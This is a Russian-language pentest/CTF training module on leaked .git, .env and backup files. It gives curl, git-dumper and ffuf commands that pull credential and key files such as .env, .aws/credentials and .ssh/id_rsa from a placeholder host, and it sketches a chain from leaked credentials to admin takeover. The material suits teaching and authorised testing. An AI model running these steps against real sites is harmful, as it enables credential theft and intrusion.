---
id: web-git-env-exposure
title: "Утечки .git/.env/backup и source disclosure"
category: web
parent: web-recon-surface
difficulty: easy
order: 2
tags: [git, env, source-disclosure, recon, backup]
prerequisites: [web-recon-fuzzing]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "Самая высокорентабельная разведка: восстановление исходников из .git, чтение .env, бэкапы и конфиги — креды и секреты."
---

Утечка исходников — один из самых недооценённых, но самых результативных веб-векторов. Если на сервере остались `.git/`, `.env`, `.svn/`, backup-архивы или конфиги, вы получаете код (со всеми секретами, эндпоинтами и логикой) без эксплуатации единой уязвимости. По статистике bug bounty такие находки регулярно ведут к критическим отчётам: из `.env` достаются ключи БД/облака/платежей, из `.git` — пароли и внутренние API.

## Теория: что ищем

| Артефакт | Что даёт |
|----------|----------|
| `.git/` | весь исходный код, история коммитов, иногда пароли в диффах |
| `.svn/`, `.hg/` | то же для SVN/Mercurial |
| `.env` | переменные окружения: креды БД, API-ключи, `SECRET_KEY` |
| `.env.bak`, `.env.old`, `.env.example` | те же секреты (иногда с реальными значениями) |
| `backup.zip`, `www.zip`, `site.tar.gz` | полный исходник |
| `config.php.bak`, `wp-config.php~` | конфиги с кредами |
| `.DS_Store`, `Thumbs.db` | имена файлов/путей |
| `composer.json`, `package.json` | зависимости → CVE |
| `.htaccess`, `web.config` | правила, иногда auth |
| `Dockerfile`, `docker-compose.yml` | внутренняя архитектура, креды |
| `.aws/credentials`, `.npmrc`, `.pypirc` | ключи |
| `id_rsa`, `.ssh/` | приватные ключи |

## Разобранный пример: восстановление .git

Если каталог `.git` отдаётся веб-сервером, скачиваем его и восстанавливаем рабочее дерево.

Шаг 1 — проверяем:

```bash
curl -s -o /dev/null -w '%{http_code}\n' https://app.example/.git/HEAD
curl -s https://app.example/.git/HEAD     # -> ref: refs/heads/main
```

Шаг 2 — качаем репозиторий целиком (быстрее всего — `git-dumper`):

```bash
git-dumper https://app.example/.git/ /tmp/leaked-repo
cd /tmp/leaked-repo && git log --oneline | head
```

Шаг 3 — смотрим историю и диффы (там бывают удалённые секреты):

```bash
git log -p | grep -iE 'password|secret|api[_-]?key|token' | head -50
git show --stat HEAD
```

Альтернатива без `git-dumper` — вручную тянуть `objects` по `index`, но это дольше; используйте автоматизацию.

## Разобранный пример: .env

Шаг 1 — пробуем типичные пути:

```bash
curl -s https://app.example/.env
curl -s https://app.example/.env.bak
curl -s https://app.example/config/.env
```

Шаг 2 — если отдаётся, извлекаем секреты:

```bash
curl -s https://app.example/.env | grep -iE 'PASS|SECRET|KEY|TOKEN|DB_|AWS_'
```

Из Laravel `.env` берём `APP_KEY` (→ deser RCE, см. `web-php-deser-chains`), из Django — `SECRET_KEY` (→ подделка сессии), из AWS — `AWS_ACCESS_KEY_ID`/`AWS_SECRET_ACCESS_KEY` (→ доступ к облаку, см. `playbook-cloud`).

## Разобранный пример: бэкап исходников

Редакторы/админы оставляют `index.php~`, `index.php.bak`, `app.zip`, `backup.tar.gz`. Ищем по словарю:

```bash
ffuf -w /tmp/backup_paths.txt -u https://app.example/FUZZ -mc 200 -e .bak,.zip,.tar.gz,.old,.save,.swp,~
```

Если нашли архив — распаковываем и читаем исходники: находим эндпоинты, креды, SQL-запросы, точки десериализации.

## Полный чек-лист путей

```text
/.git/HEAD            /.git/config          /.svn/entries
/.env                 /.env.bak             /.env.old
/config.php.bak       /wp-config.php~       /web.config
/backup.zip           /backup.tar.gz        /www.zip
/site.zip             /app.zip              /source.zip
/.DS_Store            /Thumbs.db            /.htaccess
/Dockerfile           /docker-compose.yml   /.dockerignore
/.aws/credentials     /.npmrc               /.ssh/id_rsa
/composer.json        /package.json         /Gemfile
/phpinfo.php          /info.php             /server-status
/.well-known/security.txt
```

## Разобранный пример: цепочка до takeover

1. `/.git/` → исходники → находим `/api/internal/debug` без авторизации.
2. `.env` → `DB_PASSWORD` → подключаемся к MySQL (см. `db-mysql`).
3. В БД — таблица `users` с хешами админа → offline-крекинг (см. `crypto-tool-hashcat`).
4. Вход под админом → захват приложения.

Каждая утечка сама по себе — «medium», но в цепочке — критическая.

## Инструменты автоматизации

- **`git-dumper`** — выкачка `.git`.
- **`dvcs-ripper`** — `.git`/`.svn`/`.hg`.
- **`ffuf`/`gobuster`** — поиск backup/env (см. `web-tool-ffuf`).
- **`nuclei`** — теги `exposure`, `git`, `env` (`nuclei_parse`).
- **`trufflehog`/`gitleaks`** — поиск секретов в выкачанном коде.
- **`searchsploit`** — по зависимостям из `composer.json`/`package.json`.

## Что дальше / decision

1. Проверили `/.git/HEAD`, `/.env` → 200? Качаем.
2. Есть исходники → `grep` по секретам и эндпоинтам; `git log -p` на утёкшие креды.
3. Есть креды → тестируем против БД/облака/админки.
4. Есть зависимости → ищем CVE и готовые PoC.
5. Нашли ключ облака → переходим в `playbook-cloud` (метаданные, IAM, бакеты).

## Частые ошибки

- **Ограничиться проверкой `/\.git/config`.** Каталог может отдаваться частично.
- **Не смотреть историю git.** Секреты часто в удалённых коммитах.
- **Считать `.env.example` безопасным.** Иногда там реальные значения.
- **Забыть про backup-расширения** (`~`, `.bak`, `.swp`, `.old`).
- **Не проверить `robots.txt`/`sitemap.xml`.** Там бывают «скрытые» пути.
- **Ломать прод.** Не заливайте свой код; только чтение.

## Полный разбор: восстановление .git вручную (с выводом)

Когда `git-dumper` недоступен, качаем ключевые объекты вручную (для маленьких репозиториев).

Шаг 1. Проверяем и читаем «указатели»:

```bash
curl -s https://app.example/.git/HEAD
# ref: refs/heads/main
curl -s https://app.example/.git/refs/heads/main
# 3f2c1b9...   (SHA коммита)
curl -s https://app.example/.git/config
# [core] repositoryformatversion = 0 ...
```

Шаг 2. Тянем объект коммита и разбираем его:

```bash
SHA=3f2c1b9...
mkdir -p .git/objects/${SHA:0:2}
curl -s "https://app.example/.git/objects/${SHA:0:2}/${SHA:2}" \
  -o .git/objects/${SHA:0:2}/${SHA:2}
# объект сжат zlib
python3 -c "import zlib,sys;print(zlib.decompress(open('.git/objects/${SHA:0:2}/${SHA:2}','rb').read()))"
# b'tree ...'
```

Шаг 3. Из коммита достаём SHA дерева, из дерева — файлы, рекурсивно. Это ручной путь; для реального репозитория используйте `git-dumper`:

```bash
git-dumper https://app.example/.git/ /tmp/leaked
cd /tmp/leaked && git checkout . && ls -la
```

Шаг 4. Анализируем историю — секреты часто в удалённых коммитах:

```bash
git log --all --oneline | head
git log -p --all | grep -iE 'password|secret|api[_-]?key|token|BEGIN (RSA|OPENSSH)' | head -50
git show HEAD~3:config/database.yml 2>/dev/null
```

## Reference-таблица: артефакты и что дают

| Артефакт | Проверка | Ценность |
|----------|----------|----------|
| `.git/HEAD` | `curl /.git/HEAD` | исходники + история |
| `.env` | `curl /.env` | креды БД/облака/секреты |
| `config.php.bak` | ffuf с `-e .bak` | конфиг с паролями |
| `backup.zip` | ffuf словарём | полный исходник |
| `.DS_Store` | `curl /.DS_Store` | список файлов |
| `docker-compose.yml` | `curl /docker-compose.yml` | архитектура, креды |
| `.aws/credentials` | `curl /.aws/credentials` | ключи AWS |
| `id_rsa` / `.ssh/` | `curl /.ssh/id_rsa` | приватный ключ |
| `composer.json`/`package.json` | `curl` | зависимости → CVE |
| `phpinfo.php` | `curl /phpinfo.php` | версии, пути, env |

## Секреты в истории git и trufflehog

Секреты часто коммитили, а затем «удаляли» — но они остаются в истории. `trufflehog`/`gitleaks` находят их автоматически:

```bash
trufflehog filesystem /tmp/leaked --only-verified
gitleaks detect --source /tmp/leaked -v
```

Ищем вручную по диффам:

```bash
git log -p --all | grep -nE '(AKIA[0-9A-Z]{16}|-----BEGIN|password\s*=|SECRET_KEY)' | head
```

Если секрет найден и активен (например, AWS-ключ) — проверьте его вне приложения (`aws sts get-caller-identity`). Отозванные/старые ключи тоже полезны: они раскрывают историю и внутренние системы.

## Что делать дальше / решение

1. **Проверить** `/.git/HEAD`, `/.env`, backup-расширения.
2. **Выкачать** (git-dumper/dvcs-ripper) или вручную (маленькие репозитории).
3. **Просканировать секреты** (`trufflehog`/`gitleaks`, `git log -p`).
4. **Прочитать конфиги** (`.env`, `config.php.bak`, `docker-compose.yml`).
5. **Проверить креды** против БД/облака/админки (не разрушительно).
6. **Проверить зависимости** на CVE (`searchsploit`).
7. **Оформить цепочку** (утечка → креды → доступ) как один критический отчёт.

## Практика: ffuf для бэкапов и секреты в конфигах

Готовим небольшой словарь путей и прогоняем ffuf с расширениями:

```bash
cat > /tmp/backup_paths.txt <<'EOF'
.git/HEAD
.env
.env.bak
.env.old
.env.example
config.php.bak
wp-config.php~
web.config
docker-compose.yml
Dockerfile
.aws/credentials
.npmrc
.ssh/id_rsa
backup
www
site
app
source
db
database
EOF

ffuf -w /tmp/backup_paths.txt -u https://app.example/FUZZ \
  -mc 200,403 -e .zip,.tar.gz,.bak,.old,.save,.swp,~ -t 30 -maxtime 120 -s
```

Фильтруйте результат: 200 на `.git/HEAD` — исходники; 200 на `.env` — креды. Проверяйте содержимое (не только код):

```bash
curl -s https://app.example/.env | grep -iE 'PASS|SECRET|KEY|TOKEN|DB_|AWS_|MAIL_'
curl -s https://app.example/.git/config
```

**Секреты в конфигах — что искать:**

| Файл | Ключевые переменные |
|------|---------------------|
| `.env` (Laravel) | `APP_KEY` (→ deser RCE), `DB_PASSWORD`, `AWS_*` |
| `.env` (Django) | `SECRET_KEY` (→ подделка сессии), `DATABASE_URL` |
| `config.php` | креды БД, `SECRET`, SMTP |
| `docker-compose.yml` | пароли сервисов, порты, тома |
| `.aws/credentials` | `aws_access_key_id`/`secret` |
| `wp-config.php` | `DB_PASSWORD`, `AUTH_KEY` |
| `settings.py` | `SECRET_KEY`, `ALLOWED_HOSTS` |
| `application.properties` | `spring.datasource.password` |

**Цепочка применения:** утечка `.env` → `DB_PASSWORD` → подключение к БД (`mysql -h ... -p...`) → дамп `users` → offline-крекинг → вход админом. Или `APP_KEY`/`SECRET_KEY` → подделка сессии/десериализация → RCE. Каждую креду проверяйте **не разрушительно** (только чтение) и фиксируйте результат.

## Итоговый чек-лист утечек исходников

1. `/.git/HEAD`, `/.svn/entries`, `/.hg/` — VCS.
2. `/.env`, `/.env.bak`, `/.env.old` — секреты.
3. Backup-расширения: `~`, `.bak`, `.old`, `.save`, `.swp`, `.zip`, `.tar.gz`.
4. `/.DS_Store`, `/Thumbs.db` — списки файлов.
5. `/Dockerfile`, `/docker-compose.yml` — архитектура и креды.
6. `/.aws/credentials`, `/.npmrc`, `/.ssh/id_rsa` — ключи.
7. `/composer.json`, `/package.json` — зависимости → CVE.
8. `/phpinfo.php`, `/server-status` — версии и env.

Найденное — сразу в отчёт с доказательством (curl-вывод), затем проверка кред (не разрушительно) и построение цепочки до доступа. Это самый высокорентабельный вектор разведки: он не требует уязвимости приложения.

## Замечание по этике и scope

Утечки исходников — это чтение чужих данных. В рамках теста читайте только то, что нужно для доказательства (конфиг/код/креды), не выкачивайте пользовательские данные и не публикуйте секреты. Найденные ключи проверяйте минимально (валидность) и немедленно сообщайте координатору — активные облачные креды могут быть критичны.

## Квиз

```quiz
- question: "Какой инструмент восстанавливает исходники из .git?"
  options:
    - "sqlmap"
    - "git-dumper"
    - "nmap"
    - "ffuf"
  answer: 1
  explanation: "Скачивает объекты и собирает репозиторий."
- question: "Что обычно содержит .env?"
  options:
    - "HTML"
    - "Креды и секреты (DB_PASSWORD, SECRET_KEY)"
    - "TLS-сертификат"
    - "Логи"
  answer: 1
  explanation: "Переменные окружения приложения."
- question: "Какой файл macOS раскрывает список файлов?"
  options:
    - ".env"
    - ".DS_Store"
    - ".gitignore"
    - "robots.txt"
  answer: 1
  explanation: "Метаданные Finder."
- question: "Что искать в восстановленном коде?"
  options:
    - "Только ошибки"
    - "Пароли, API-ключи, токены, SECRET_KEY"
    - "Только CSS"
    - "Только картинки"
  answer: 1
  explanation: "Секреты — главная ценность."
- question: "Как проверить наличие .git быстро?"
  options:
    - "curl /"
    - "curl /.git/HEAD"
    - "nmap"
    - "ping"
  answer: 1
  explanation: "HEAD отдаёт ссылку на ветку."
```

## Где пригодится

- **CTF (Web):** утечки исходников — быстрый путь.
- **Bug bounty:** открытый `.git`/`.env` — критичный отчёт.
- **Пентест:** первичная разведка.
- **Работа (DevOps/AppSec):** запрет доступа к VCS/конфигам, чистка бэкапов, секрет-менеджмент.
